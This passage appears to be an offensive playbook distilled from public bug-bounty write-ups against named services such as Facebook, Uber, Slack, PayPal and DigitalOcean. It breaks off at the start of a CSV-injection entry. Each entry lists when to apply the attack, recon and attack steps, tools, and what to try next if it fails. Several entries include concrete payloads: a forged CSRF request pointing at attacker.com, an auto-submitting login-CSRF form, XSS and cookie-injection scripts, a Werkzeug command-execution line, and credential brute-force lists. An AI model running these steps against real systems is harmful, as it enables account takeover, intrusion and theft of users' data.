Step 2: Observe the POST request made when submitting a site using a browser's developer tools, noting the parameters and headers, especially `fb_dtsg`.
attack_steps: Step 1: Craft a POST request to `/cp/onboarding/submit/` with the `fb_dtsg` parameter intentionally removed or replaced with an invalid value.
Step 2: Send the crafted request using the victim's authenticated session (e.g., via a malicious link or embedded form on an attacker-controlled site).
Step 3: Observe the server's response.
payloads_or_patterns:
POST /cp/onboarding/submit/ HTTP/1.1
Host: partners.facebook.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Content-Length: XXX
Cookie: <SESSION_TOKEN>
Pragma: no-cache
Cache-Control: no-cache

fb_dtsg=&site_name=<ANY_SITE>&short_description=<ANY_DESC>&long_description=<ANY_DESC>&category=communication&submission_id=<ANY_ID>&partner_id=&country_configs[IN][locales][en_GB][http]=http://attacker.com/&country_configs[IN][locales][en_GB][https]=&country_configs[IN][default]=en_GB&country_configs[IN][status]=pending1&country_configs[IN][comment]&country_configs[IN][action]=add&country_configs[IN][config_fbid]=1664831780469753& country_configs[IN][is_editable]=true&country_configs[IN][is_deletable]=true&__user=<USER_ID>&__a=1
tools_recommended: Burp Suite: To capture, modify, and resend HTTP requests, and to generate malicious links.
success_indicators: A 200 OK response from the server when the `fb_dtsg` token is missing or invalid, indicating the action was processed without proper CSRF protection.
failure_indicators: A 403 Forbidden or similar error response indicates CSRF protection is in place. Pivot to testing other endpoints or looking for other vulnerabilities.

playbooks.impact: An attacker can force an authenticated user to submit arbitrary websites to the Facebook Partners portal, potentially leading to unintended site registrations or manipulations within the platform.
playbooks.key_lesson: Always validate CSRF tokens server-side for any state-changing or sensitive action initiated by an authenticated user, even if the endpoint is not commonly accessed.

meta.title: Bug Bounty : Account Takeover Vulnerability POC

trigger_conditions.when_to_apply: When the target application allows users to connect their Facebook account for login or integration, and the OAuth flow is implemented without a 'state' parameter.
prerequisites: Target application uses Facebook OAuth for authentication/integration.
Facebook is vulnerable to login CSRF (for the first exploit method).
Target application is vulnerable to stored self-XSS (for the second exploit method).
applicability_signals: Presence of a 'Connect with Facebook' or similar option.
Facebook OAuth redirect URL does not contain a 'state' parameter.
An endpoint like `/user_profile.php?action=fb_connect` exists.
Existence of an endpoint vulnerable to stored self-XSS, e.g., `/user_overview.php?msg=<param>`.
skip_if: Facebook OAuth implementation correctly uses the 'state' parameter.
Facebook login is not vulnerable to CSRF.
No stored self-XSS vulnerabilities are present on the target application.

recon_steps: Step 1: Inspect the 'Connect with Facebook' OAuth flow by clicking the button and observing the GET request to Facebook's OAuth dialog. Look for the `redirect_uri` and `client_id`. Verify the absence of the `state` parameter.

Step 2: Identify potential stored self-XSS vulnerabilities by testing common parameters (e.g., `msg`, `redirect`) on various user-facing pages. Use payloads like `'><script>alert(1)</script>` to confirm XSS.
attack_steps: Step 1 (Exploit Method 1 - Facebook Login CSRF): Craft an HTML form that automatically submits attacker's Facebook credentials to `https://www.facebook.com/login.php`. The `next` parameter of this form should point to the Facebook OAuth dialog URL, which in turn redirects to the target application's `fb_connect` endpoint.

Step 2 (Exploit Method 1 - Bypassing Approval Prompt): Pre-connect the attacker's Facebook account to their own `www.example.com` account. This ensures that Facebook does not prompt for app approval when the attacker's Facebook account is used to connect to a victim's `www.example.com` account.

Step 3 (Exploit Method 1 - Final Payload): Combine the Facebook login CSRF and the OAuth redirect into a single HTML page with `onload=document.getElementById('id').submit()` to automatically execute the attack.

Step 4 (Exploit Method 2 - Stored XSS and OAuth Code Theft): Plant a stored self-XSS payload in a vulnerable endpoint (e.g., `https://www.example.com/user_overview.php?msg=93`). The payload should capture the OAuth code from the redirect URL.

Step 5 (Exploit Method 2 - Forging Connect Request): Manually or through another CSRF vector, trick the victim into triggering the Facebook OAuth flow with the attacker's Facebook account. The `redirect_uri` should be crafted to include the attacker's XSS payload endpoint and the stolen OAuth code.
payloads_or_patterns: Facebook Login CSRF Form Snippet: `<form action="https://www.facebook.com/login.php" method="POST"><input type=text name=email value=FB_USERNAME><input type=text name=pass value=FB_PASSWORD></form>`

Combined Exploit Payload (Method 1): `<html><body onload=document.getElementById("id").submit()><form id='id' action="https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fv2.2%2Fdialog%2Foauth%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.example.com%252Fuser_profile.php%253Faction%253Dfb_connect%26scope%3Demail%252Cuser_birthday%252Cuser_education_history%252Cuser_hometown%252Cuser_location%26client_id%3D111111111111111" method="POST"><input type=text name=email value=FB_USERNAME><input type=text name=pass value=FB_PASSWORD><input type=submit></form></html>`
Stored Self-XSS Payload (Method 2): `"'><script>alert("Sending your fb tokens to Attacker ="+document.location.search)</script><`
tools_recommended: Burp Suite: To intercept and analyze HTTP requests, especially the OAuth redirect.
Browser Developer Tools: To inspect HTML, JavaScript, and network activity.
success_indicators: Victim's Facebook account gets linked to the attacker's `www.example.com` account.
Attacker can log in to the victim's `www.example.com` account using their (attacker's) Facebook credentials.
The XSS payload successfully executes in the victim's browser and sends the OAuth code to the attacker's server (Method 2).
failure_indicators: Facebook requires app approval for the connection and the attacker has not pre-connected their account (Method 1) → Proceed with Method 2 if applicable.
No `state` parameter in OAuth, but Facebook login CSRF is not possible → Look for other OAuth vulnerabilities like leakage of the auth code.
Stored XSS payload does not execute or does not capture the URL parameters → Re-evaluate XSS payload or look for other injection points.

playbooks.impact: Account takeover of `www.example.com` users by linking their Facebook accounts to the attacker's account.
playbooks.key_lesson: Always validate OAuth requests for the presence of a `state` parameter to prevent CSRF attacks on the OAuth flow.

meta.title: How I snooped into your private Slack messages

affected_components: Subdomains used for email delivery (e.g., uraniumsecteam.slack.com)
target_profile.required_access_level: any_authenticated_user (with Standard plan or above to install Email app)
tech_stack_fingerprints: MX records for slack.com and its subdomains point to a third-party email service
Email app integration provides a unique email address like <hashedtext>@<teamname>.slack.com

trigger_conditions.when_to_apply: When Slack subdomains are configured to use a third-party email service, and those specific subdomains used by the Email app are not properly claimed or verified, allowing for interception of emails.
prerequisites: Slack account with 'Standard' plan or higher to install the Email app.
Ability to identify Slack subdomains used by the Email app.
Access to a domain or subdomain that can be configured to receive emails and forward them.
applicability_signals: Slack subdomains have MX records pointing to a third-party email provider.
The Email app integration for a Slack team provides an email address with a subdomain that is not actively claimed by Slack.
A user can install the Email app and obtain a unique email address for their channel.
skip_if: All Slack subdomains used by the Email app are properly claimed and verified by Slack.
The third-party email service does not allow for domain claiming or subdomain hijacking.
Slack's Email app does not use third-party email services for its integrations.

recon_steps: Step 1: Use DNS enumeration tools (e.g., `dig`, `nslookup`) to query MX records for slack.com and its subdomains to identify third-party email services in use.

Step 2: Identify potential slack.com subdomains that might be used for email delivery by looking at the domain part of the email addresses generated by Slack's Email app (e.g., @uraniumsecteam.slack.com).
Step 3: Research the identified third-party email service to understand its domain claiming process and check if the target slack.com subdomains are available for claiming.
attack_steps: Step 1: Upgrade Slack account to 'Standard' plan or above and install the Email app on a chosen channel.
Step 2: Obtain the unique email address provided by the Email app for the channel (e.g., <hashedtext>@<teamname>.slack.com).
Step 3: Claim the subdomain (e.g., <teamname>.slack.com) within the third-party email service used by Slack, directing all incoming emails for that subdomain to an attacker-controlled email address.
Step 4: Send a test email to the Slack Email app's generated address (<hashedtext>@<teamname>.slack.com).
Step 5: Verify if the test email is received at the attacker-controlled email address instead of the Slack channel.
payloads_or_patterns: Not applicable, exploit relies on configuration and domain claiming, not specific message payloads.
tools_recommended: Dig/Nslookup for DNS queries.
HackerOne/Bugcrowd for program research.
Third-party email provider's web interface for domain claiming.
Slack account with Standard+ plan.
success_indicators: The test email sent to the Slack Email app's address is received at the attacker's controlled email inbox.
Emails intended for a specific Slack channel via the Email app are intercepted by the attacker.
Slack's security team confirms the vulnerability and its impact.
failure_indicators: The test email is not received at the attacker's inbox and still appears in the Slack channel.
The target subdomain cannot be claimed within the third-party email service.
Slack's Email app rejects emails sent to the generated address even after subdomain claiming.

playbooks.impact: An attacker could intercept private messages sent to Slack channels via the Email app, read sensitive information, modify messages before they reach the channel, or disrupt communication. This allows for snooping into any team's private messages.
playbooks.key_lesson: Always ensure that all subdomains used for third-party integrations, especially those handling sensitive communication like email, are properly claimed and verified to prevent subdomain takeover vulnerabilities.

meta.title: Decoding a $😱,000.00 htpasswd bounty

trigger_conditions.when_to_apply: This technique is applicable when an attacker discovers a directory protected by HTTP Basic Authentication and suspects weak or default credentials, or a common password that may have been reused.
prerequisites: Target directory is protected by HTTP Basic Authentication.
applicability_signals: Target returns a 401 Unauthorized status code with a 'WWW-Authenticate: Basic realm="some_realm"' header.
skip_if: The target's HTTP Basic Authentication realm explicitly indicates it's a sensitive area and brute-forcing is likely monitored or blocked.
The server employs strong brute-force protection mechanisms (e.g., CAPTCHAs, temporary IP bans).

recon_steps: Step 1: Scan web server for directories protected by HTTP Basic Authentication by observing 401 Unauthorized responses with WWW-Authenticate headers.
Step 2: Identify the 'realm' value from the WWW-Authenticate header to understand the context of the protected resource.
attack_steps: Step 1: Attempt to authenticate to the protected resource using a list of common, default, or previously leaked credentials (e.g., admin/admin, admin/password, root/root, etc.).
Step 2: If a common username like 'admin' or 'root' is used, systematically try common passwords associated with these users.
Step 3: If a specific realm is identified (e.g., 'Secure Upload'), try passwords known to be weak or commonly used for that context.
Step 4: If initial common credential attempts fail, consider using a more extensive dictionary attack against the suspected username(s).
payloads_or_patterns: Common username/password pairs: admin/admin, admin/password, root/root, user/user, test/test
Default credentials for common software (e.g., routers, CMS).
Credentials leaked from other breaches for the target organization.
tools_recommended: Burp Suite Intruder: For dictionary attacks against the username and password fields of the Basic Authentication prompt.
Hydra: A network logon cracker that supports HTTP Basic Authentication.
success_indicators: Receiving a 200 OK or other successful HTTP status code after submitting credentials, indicating access to the protected resource.
Observation of files or directory listings that were previously inaccessible.
failure_indicators: Consistent 401 Unauthorized responses after multiple attempts with common credentials → Indicates a strong password or incorrect username. Pivot to subdomain enumeration or content discovery for other potential entry points.
Received a 403 Forbidden response after successful authentication → Indicates an authorization issue rather than authentication. Re-evaluate privileges.

playbooks.impact: Unauthorized access to sensitive files or directories protected by htpasswd, potentially leading to data leakage, system compromise, or further exploitation.
playbooks.key_lesson: Always test HTTP Basic Authentication endpoints with common, default, and leaked credentials as a primary attack vector for misconfigurations.

meta.title: Internet Explorer has a URL problem

tech_stack_fingerprints: Specific behavior of URL decoding for hostnames

trigger_conditions.when_to_apply: When a web application or service relies on user-provided URLs for redirects, especially in authentication flows like OAuth, and the target environment uses vulnerable versions of Internet Explorer.
prerequisites: Target environment uses Internet Explorer 11 on Windows 7 or Windows 8.1.
The web application/service accepts URL-encoded hostnames in redirect URLs.
applicability_signals: Discovery of an OAuth `redirect_uri` parameter that accepts URL-encoded hostnames.
Observation of different redirection behavior in IE compared to other browsers when processing URL-encoded hostnames.
skip_if: Target environment uses Windows 10 or later versions of IE.
The application strictly validates redirect URIs and does not allow URL-encoded hostnames or uses strict normalization that prevents the described IE behavior.

recon_steps: Step 1: Identify the target application and its OAuth 2.0 authorization endpoint.
Step 2: Inspect the `redirect_uri` parameter during the OAuth authorization flow. Test if the application accepts URL-encoded hostnames in the `redirect_uri`.
Step 3: Specifically test the handling of triple-encoded hostnames (e.g., `https://%252567%252569%252573%252574.github.com/auth/github/callback/`) in the `redirect_uri` for GitHub OAuth.
attack_steps: Step 1: Construct a malicious `redirect_uri` using URL encoding for a hostname that is close to the legitimate one but leads to an attacker-controlled domain. For example, using `https://httpbin.org/redirect-to?url=http://%77%77%77%2E%6D%69%63%72%6F%73%6F%66%74%2E%63%6F%6D/test` as an example for testing redirect behavior generally.

Step 2: For GitHub OAuth, use a triple-encoded `redirect_uri` like `https://%252567%252569%252573%252574.github.com/auth/github/callback/` (replace `gist` with a malicious subdomain or domain if possible) in the OAuth authorization request.

Step 3: If the target is an OAuth provider, observe the final redirection URL after the user authorizes the application. If the user is redirected to an unexpected host (due to IE's specific URL decoding), this indicates a successful open redirect.

Step 4: For potential code theft in GitHub OAuth, if the `redirect_uri` is set to a triple-encoded URL that resolves to a different domain, and the authorization code is still sent, it could be exfiltrated by the attacker-controlled redirect server.
tools_recommended: Burp Suite: To intercept and modify requests, especially the `redirect_uri` parameter.
A custom redirect server or a service like httpbin.org: To observe where the redirection leads.
success_indicators: The browser, when using IE 11 on Win 7/8.1, redirects to a different hostname than what was explicitly provided after URL decoding, which is different from other browsers' behavior.
In GitHub OAuth, a triple-encoded `redirect_uri` results in a redirection to an attacker-controlled domain while still receiving the authorization code.
failure_indicators: All browsers redirect to the intended `redirect_uri`, indicating strict URL validation or lack of the specific IE vulnerability.
A 400 Bad Request or similar error response when using triple-encoded URLs, suggesting the input is not accepted.

playbooks.impact: Unauthorized redirection of users to attacker-controlled websites, potentially leading to phishing, credential theft, or in the context of OAuth, theft of authorization codes which can then be exchanged for access tokens.
playbooks.key_lesson: When dealing with URL redirects, especially in authentication flows, consider browser-specific URL parsing and encoding behaviors, particularly for older or less common browsers, as they might exhibit non-standard handling that can be exploited.

meta.title: Reading Uber’s Internal Emails

affected_components: subdomains with MX records pointing to SendGrid
tech_stack_fingerprints: emails sent from Uber with reply-to address using a subdomain (e.g., @em.uber.com)

trigger_conditions.when_to_apply: When a subdomain's MX records point to SendGrid and the subdomain has not been claimed by Uber within SendGrid's Inbound Parse Webhook functionality.
prerequisites: Attacker has a SendGrid account.
Target's subdomain's MX records point to SendGrid.
applicability_signals: DNS lookup for a subdomain reveals MX records pointing to mx.sendgrid.net.
Target uses SendGrid for sending emails, indicated by reply-to addresses in their emails (e.g., password reset emails).
skip_if: The subdomain is already claimed by Uber within SendGrid's Inbound Parse Webhook.
SendGrid's Inbound Parse Webhook requires domain verification which Uber has already completed for the target subdomain.

recon_steps: Step 1: Perform DNS lookups (e.g., using `dig` or online tools) for known Uber subdomains to identify MX records pointing to SendGrid (e.g., `mx.sendgrid.net`).
Step 2: Analyze emails sent by Uber (e.g., password reset, notifications) to identify reply-to email addresses associated with their subdomains.
attack_steps: Step 1: Sign up for a SendGrid account.
Step 2: Attempt to claim the target subdomain (e.g., `em.uber.com`) within SendGrid's 'Inbound Parse Webhook' settings.
Step 3: If the domain can be claimed, configure a webhook endpoint to receive inbound emails. This may involve setting up a local web server and tunneling it with ngrok.
Step 4: Send test emails to the claimed subdomain to confirm reception and ability to intercept emails.
Step 5: Observe received emails for sensitive information, such as internal logs (e.g., Sentry logs sent as emails) or other internal communications.
payloads_or_patterns: SendGrid Inbound Parse Webhook configuration pointing to an attacker-controlled URL.
Python script to process inbound emails via SendGrid API.
tools_recommended: SendGrid account
ngrok (for tunneling local server)
Python (for script to handle webhook data)
DNS lookup tools (dig, nslookup, online DNS checkers)
success_indicators: Successful reception of emails sent to the claimed subdomain at the attacker-controlled webhook endpoint.
Receipt of sensitive information within the intercepted emails, such as internal logs or emails from other users.
failure_indicators: SendGrid indicates the domain is already claimed.
Webhook does not receive any inbound emails after configuration.
SendGrid requires domain verification that cannot be bypassed.

playbooks.impact: Information disclosure, potential for further attacks if sensitive credentials or internal data are exposed via intercepted emails.
playbooks.key_lesson: Always verify that all subdomains with MX records pointing to third-party email services are correctly configured and claimed by the owning organization to prevent subdomain takeovers and email interception.

meta.title: RCE In AddThis

trigger_conditions.when_to_apply: When a target is identified to be running a Werkzeug debugger on a publicly accessible IP address and port, and the debugger is not properly secured.
prerequisites: Werkzeug debugger is publicly accessible.
applicability_signals: Shodan search results showing IP addresses and open ports associated with AddThis servers.
Discovery of the `addth.is` domain and port `5000`.
skip_if: Werkzeug debugger is not found on any public IP or port.
The debugger is protected by authentication or is not exposed externally.

recon_steps: Step 1: Use Shodan to search for open ports on IP addresses associated with AddThis servers.
Step 2: Identify any open ports that might be running a web application or debugger, specifically looking for port 5000.
Step 3: Correlate identified IP addresses and ports with known AddThis domains, such as `addth.is`.
attack_steps: Step 1: Access `http://<TARGET_IP>:5000/` or `http://addth.is:5000/` to check for the presence of the Werkzeug debugger interface.
Step 2: If the Werkzeug debugger interface is accessible, attempt to trigger the debugger console to execute arbitrary Python code.
Step 3: Utilize the debugger console to confirm code execution, for example by running a simple command like `print(1)` or `__import__('os').system('id')`.
tools_recommended: Shodan for recon
Web browser for accessing the debugger
success_indicators: The Werkzeug debugger interface is displayed.
Execution of arbitrary commands via the debugger console, e.g., output of `id` command.
The target server responds with the output of the executed command.
failure_indicators: Port 5000 is closed or returns a generic error (e.g., 404, 503).
The debugger interface is not found or is protected by authentication.
Attempts to execute commands result in errors or no output.

playbooks.impact: Remote Code Execution (RCE) allowing an attacker to run arbitrary commands on the AddThis server.
playbooks.key_lesson: Always scan for and enumerate exposed debuggers (like Werkzeug) on public-facing servers, as they can be a direct RCE vector if left unsecured.

meta.title: PornHub: Email Confirmation Bypass

trigger_conditions.when_to_apply: When a user needs to verify their email address to complete account setup on PornHub, and the confirmation process can be manipulated.
prerequisites: Attacker has signed up for an account on PornHub or has access to a newly created account that requires email verification.
applicability_signals: The presence of a user confirmation URL with `id` and `code` parameters, e.g., `http://www.pornhub.com//user/confirm?id=[idname]&code=[code]`.
The user ID (`idname`) can be retrieved by viewing the source of the user profile page (`pornhub.com/users/[username]`).
skip_if: The confirmation code is securely tied to the user's session and cannot be brute-forced or predicted.
There are rate limits or account lockouts for repeated incorrect confirmation attempts.

recon_steps: Step 1: Sign up for a new user account on PornHub to trigger the email verification process.
Step 2: Navigate to the user's profile page (`http://www.pornhub.com/users/<username>`) and view the page source to extract the user's `id` parameter.
Step 3: Analyze the confirmation email received to identify the structure of the confirmation URL and the `id` and `code` parameters.
attack_steps: Step 1: Construct a confirmation URL using the target user's ID (`<TARGET_USER_ID>`) and attempt to brute-force the `code` parameter.
Step 2: Send multiple requests to `http://www.pornhub.com//user/confirm?id=<TARGET_USER_ID>&code=<BRUTE_FORCED_CODE>` to try and find a valid confirmation code.
Step 3: If a valid code is found, the attacker can bypass the email verification for the target account.
tools_recommended: Burp Suite Intruder: To automate the brute-forcing of the `code` parameter in the confirmation URL.
Custom script (e.g., Python with `requests`): For more targeted brute-forcing or if Intruder proves difficult to set up.
success_indicators: The account associated with `<TARGET_USER_ID>` becomes fully verified without the legitimate user's interaction or knowledge.
A successful confirmation request results in a redirect to the user's dashboard or a success message, and the account is usable without further email verification.
failure_indicators: Receiving a 'invalid code' or similar error message for all attempted `code` values.
Account lockout or IP ban after a certain number of failed attempts (if implemented).
Response codes other than 2xx for successful confirmation, indicating the validation logic is not bypassed (e.g., 400, 403, 404).

playbooks.impact: An attacker can bypass email verification for any user account, allowing them to potentially take over accounts, access sensitive user information, or perform actions on behalf of the user.
playbooks.key_lesson: When email verification relies on a code, investigate if there are rate limits, if the code is predictable, or if brute-forcing is possible without triggering security measures.

meta.title: Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded

trigger_conditions.when_to_apply: When a Self-Stored XSS vulnerability can be chained with an arbitrary cookie installation vulnerability on a subdomain that allows for authentication via a specific cookie.
prerequisites: A Self-Stored XSS vulnerability on m.uber.com.
An arbitrary cookie installation vulnerability on business.uber.com or a related subdomain scoped to *.uber.com.
The target user must be logged into m.uber.com.
applicability_signals: Existence of a Self-Stored XSS that can be triggered by a logged-in user on m.uber.com.
Observation that m.uber.com authentication uses a 'token' cookie, while other uber domains (riders|login|partners|anything).uber.com require an 'oauth2' cookie.
Discovery of an endpoint on business.uber.com that injects unsanitized user input into the 'Cookie' header.
skip_if: No Self-Stored XSS found.
No cookie injection vulnerability found that can set cookies for *.uber.com.
The target user is not authenticated on m.uber.com.

recon_steps: Step 1: Identify potential Self-Stored XSS vectors on m.uber.com by attempting to modify profile details or other user-controllable input that is reflected on the page.
Step 2: Investigate authentication mechanisms for various uber subdomains. Note differences in required cookies (e.g., 'token' vs. 'oauth2').

Step 3: Test endpoints on business.uber.com (or similar administrative/business-related subdomains) for cookie injection vulnerabilities by providing malicious cookie data within URL parameters that are reflected in HTTP headers.
attack_steps: Step 1: Exploit the Self-Stored XSS on m.uber.com to redirect the victim to a malicious page that first triggers the XSS to potentially log them into the attacker's account (or prepare for the next step).
Step 2: Craft a URL for business.uber.com that injects a malicious cookie (e.g., setting the 'token' cookie for the victim's session) and an arbitrary cookie for *.uber.com.
Step 3: The crafted URL will trigger the cookie injection, setting the attacker-controlled 'oauth2' cookie for the victim's session on *.uber.com.

Step 4: The victim, now authenticated with their own credentials but under the attacker's control due to the injected cookie, will have their sensitive 'oauth2' cookie accessible via the Self-XSS payload on m.uber.com.
payloads_or_patterns: <script>function exploit() { setTimeout(function() { var s1 = new XMLHttpRequest(); s1.open('GET', 'https://m.uber.com/', false); s1.send(null); document.location.href= 'https://m.uber.com/'; }, 3000); }</script><body onload='exploit()'><script>var xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET', 'https://business.uber.com/new/confirm/test;,token=XXXXXXXXXXXXXXX;domain=.uber.com', false); // insert your token here xmlhttp.send(null);</script>
tools_recommended: Burp Suite: To intercept and modify requests, analyze responses, and identify injection points.
Custom script: For automating the XSS payload and cookie injection process.
success_indicators: The victim's 'oauth2' cookie being accessible via JavaScript on m.uber.com after they visit the attacker-controlled page.
Successful redirection to m.uber.com with the attacker's session active or being able to leverage the victim's session.
failure_indicators: 403 Forbidden or 404 Not Found on business.uber.com when attempting cookie injection (suggests the endpoint is not vulnerable or misconfigured).
No cookie being set for *.uber.com despite the injection attempt (indicates sanitization or incorrect domain scoping).
The Self-XSS on m.uber.com not triggering or not being able to access the injected cookie (suggests a DOM-based issue or browser limitations).

playbooks.impact: An attacker can steal the OAuth2 cookie of any logged-in Uber user, granting them full access to the victim's account and the ability to perform any action on their behalf, including making fraudulent rides, accessing personal information, or modifying account settings.
playbooks.key_lesson: Always attempt to chain lower-severity vulnerabilities (like Self-XSS) with other findings (like cookie injection) to achieve a higher impact and exploit sensitive session tokens.

meta.title: Floating Domains – Taking Over 20K DigitalOcean Domains via a Lax Domain Import System

trigger_conditions.when_to_apply: When a domain is no longer actively managed in DigitalOcean's DNS, but its DNS records still point to DigitalOcean nameservers.
prerequisites: Attacker can register a domain name.
The target domain's nameservers are configured to point to DigitalOcean's nameservers.
The domain has been deleted from the original owner's DigitalOcean account.
applicability_signals: A domain is configured to use DigitalOcean nameservers.
Checking for deleted domains that still resolve to DigitalOcean infrastructure.
skip_if: The domain's nameservers are not pointing to DigitalOcean.
The domain is actively managed in a DigitalOcean account.

recon_steps: Step 1: Identify domains that are configured to use DigitalOcean nameservers.
Step 2: Search for lists of potentially abandoned or misconfigured domains.
Step 3: For each identified domain, verify that its DNS records still resolve to DigitalOcean infrastructure (e.g., using `dig` or online DNS lookup tools).
attack_steps: Step 1: Identify a domain that was previously added to DigitalOcean's DNS but is no longer actively managed by its owner.
Step 2: Register the target domain name to your own account.
Step 3: Attempt to add the domain to your DigitalOcean account via the 'Add Domain' feature.
Step 4: Configure DNS records within your DigitalOcean account to point to your controlled infrastructure (e.g., a server with a specific banner or response).
payloads_or_patterns: N/A - This is a configuration-based takeover, not a payload injection.
tools_recommended: `dig` or `nslookup` for DNS lookups.
Online domain availability checkers.
Scripts to enumerate domains and check their DNS configurations.
success_indicators: The domain successfully resolves to the attacker-controlled infrastructure (e.g., showing a custom webpage, responding with a specific banner).
DigitalOcean allows the addition of the domain to the attacker's account without ownership verification.
failure_indicators: DigitalOcean rejects the domain addition with an error indicating it's already in use or requires ownership verification.
The domain does not resolve to DigitalOcean nameservers.

playbooks.impact: Takeover of any subdomain pointing to the compromised domain, leading to potential hosting of malicious content, phishing pages, or even code execution if specific services are configured on those subdomains.
playbooks.key_lesson: Always ensure that when a domain is removed from a DNS provider's service, any associated DNS records are also purged or invalidated to prevent accidental takeovers.

meta.title: [demo.paypal.com] Node.js code injection (RCE)

trigger_conditions.when_to_apply: When a web application uses a server-side templating engine (like Dust.js) that internally uses `eval()` for complex expression evaluation, and user-supplied input is not properly sanitized before being passed to such expressions.
prerequisites: The target application must be running Node.js.
The application must use the Dust.js templating engine, specifically an older version that exposes sensitive functionality.
An endpoint that accepts user-controlled input that is then processed by Dust.js helpers, especially the 'if' helper.
applicability_signals: Observing different server responses for specific characters like '\' and '%0a' when fuzzed against HTTP parameters.
Receiving 'syntax error' messages in HTTP responses during fuzzing.
Identifying the use of Dust.js as a templating engine.
skip_if: No 'syntax error' observed for '\' or '%0a' inputs.
Application uses a patched version of Dust.js or sanitizes input effectively before `eval()`.

recon_steps: Step 1: Access demo.paypal.com and observe its behavior, particularly for any administrative or demo features.
Step 2: Perform HTTP parameter fuzzing on discovered endpoints (e.g., /demo/navigation) with special characters like '\', '%0a', ''', '"', and observe response codes and error messages.
attack_steps: Step 1: Identify the parameter being used by the 'if' Dust.js helper (e.g., 'device' in the example).
Step 2: Construct a payload by appending a JavaScript expression that triggers `eval()` in the 'if' helper, attempting to bypass character sanitization.
Step 3: For example, send a request like: `GET /demo/navigation?device=xxx\` where `xxx` is a crafted payload that exploits the `eval()` functionality.
Step 4: Observe the server's response for signs of code execution or errors indicating successful exploitation.
payloads_or_patterns: Payload example: The writeup implies that by sending '\' instead of a string, the application attempts to evaluate a JavaScript expression within the 'if' helper, leading to a syntax error that can be manipulated for code execution. The exact payload for RCE is not fully detailed but would involve crafting an expression that `eval()` can parse and execute on the server, potentially achieving remote code execution.
Specific exploit payload for RCE would leverage the `eval` call within Dust.js's 'if' helper to execute arbitrary Node.js code.
tools_recommended: Burp Suite (for fuzzing and request modification)
Custom scripts (for advanced fuzzing and payload generation)
success_indicators: Receiving an HTTP response that indicates successful Node.js code execution, such as a reverse shell connection, command output in the response, or a specific error message that implies successful code injection.
The server logs indicate an unhandled exception originating from the injected JavaScript code.
failure_indicators: All attempts result in a 400 Bad Request or 500 Internal Server Error without clear signs of code execution.
The application returns a 200 OK status without any observable change or error indicating vulnerability.
Responses consistently indicate that the input is treated as a string and not evaluated as code. This might indicate patching or lack of vulnerable 'if' helper usage.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing an attacker to execute arbitrary commands with the privileges of the Node.js process. This could lead to full system compromise, data exfiltration, or further lateral movement within the network.
playbooks.key_lesson: Always scrutinize server-side templating engines for potential code injection vulnerabilities, especially when user-supplied input influences dynamic expression evaluation or functions like `eval()`.

meta.title: Samsung Galaxy Apps MiTM vulnerabilities

affected_components: API requests made by the application

trigger_conditions.when_to_apply: When the Samsung Galaxy Apps application communicates over unencrypted HTTP, allowing for Man-in-the-Middle attacks to intercept and modify API requests and responses.
prerequisites: Attacker must be on the same network as the target device.
The target device must be running a vulnerable version of Samsung Galaxy Apps.
applicability_signals: Application makes API calls over HTTP (not HTTPS).

Observable API endpoints like `productDetailOverview`, `bigBannerList`, `expertCommentList`, `commentList`, `productDetailRelated`, `categoryProductList2Notc`, `sellerProductList2Notc`, `androidManifestList`.
skip_if: All API requests are made over HTTPS.
The application implements certificate pinning.
A Web Application Firewall (WAF) is present and effectively blocks MITM tools.

recon_steps: Step 1: Use a network sniffing tool (e.g., Wireshark) on the same network as a target device running Samsung Galaxy Apps to observe traffic.
Step 2: Identify API endpoints being used by the application and check if they are using HTTP or HTTPS. Look for patterns like XML-based requests and responses.
attack_steps: Step 1: Set up a Man-in-the-Middle proxy (e.g., BetterCap, Burp Suite) on the network.
Step 2: Configure the target device to route its traffic through the MITM proxy.
Step 3: Browse the Samsung Galaxy Apps application on the target device.
Step 4: Intercept the `androidManifestList` request when a user attempts to install an application.
Step 5: Modify the XML response for `androidManifestList` to contain only the `INTERNET` permission.
Step 6: Forward the modified response to the target device.
Step 7: Observe if the application installs without prompting for user confirmation of permissions.
Step 8: Intercept session cookies (e.g., `UUID`, `JSESSIONID`) from other API requests (e.g., `productDetailOverview`) sent over HTTP.
Step 9: Use the stolen session cookies to impersonate the user and make API requests on their behalf.
payloads_or_patterns: Intercepted XML response for `androidManifestList` should be modified to something like: `<permissions><permission name="INTERNET" enabled="true"/></permissions>`
tools_recommended: BetterCap (with custom proxy module)
Burp Suite (Proxy and Repeater)
Wireshark
success_indicators: An application installs without the user seeing or approving the permissions dialog.
Successful API requests made to Samsung Galaxy Apps API endpoints using stolen session cookies, indicating user impersonation.
Ability to view or modify application details (images, names, descriptions) by intercepting and altering XML responses.
failure_indicators: All traffic is observed to be over HTTPS, indicating MITM is not feasible.
API requests are blocked or return errors when modified, suggesting input validation or response integrity checks.
The application crashes or behaves unexpectedly after modifying responses, indicating potential for unexpected side effects but not direct exploitation of the intended vulnerability.

playbooks.impact: Allows an attacker to: 1. Install applications on a user's device without their explicit consent or knowledge of required permissions. 2. Exfiltrate user session identifiers (`UUID`, `JSESSIONID`) to impersonate the user and perform actions on their behalf within the Galaxy Apps store. 3. Potentially manipulate displayed app information (images, descriptions) to deceive users.
playbooks.key_lesson: Always verify that mobile applications use HTTPS for all sensitive API communications and implement proper certificate pinning to prevent Man-in-the-Middle attacks.

meta.title: CSV Injection -> Meterpreter on Pornhub

trigger_conditions.when_to_apply: When a web application allows users to export data, such as video statistics, in CSV format, and the application fails to properly sanitize user-supplied input in fields like video titles.
prerequisites: The target application must have a feature to export data in CSV format.
The user must be able to influence the data that is exported, specifically in fields that will be rendered within the CSV file.
applicability_signals: Presence of an 'export statistics' or similar functionality that generates CSV files.
Ability to modify data that is displayed in exported reports, such as video titles.
skip_if: All exported CSV fields are strictly alphanumeric and do not allow special characters.
The application performs robust server-side sanitization of all input fields used in CSV exports, properly escaping characters like '=', '@', '+', '-', etc.

recon_steps: Identify any export functionality within the web application, particularly those generating CSV files.
Investigate the fields that can be influenced by the user and are included in the exported CSV, such as user-generated content titles or descriptions.
attack_steps: Step 1: Craft a malicious payload that leverages CSV injection syntax to execute commands. Start with a simple command like calculator.
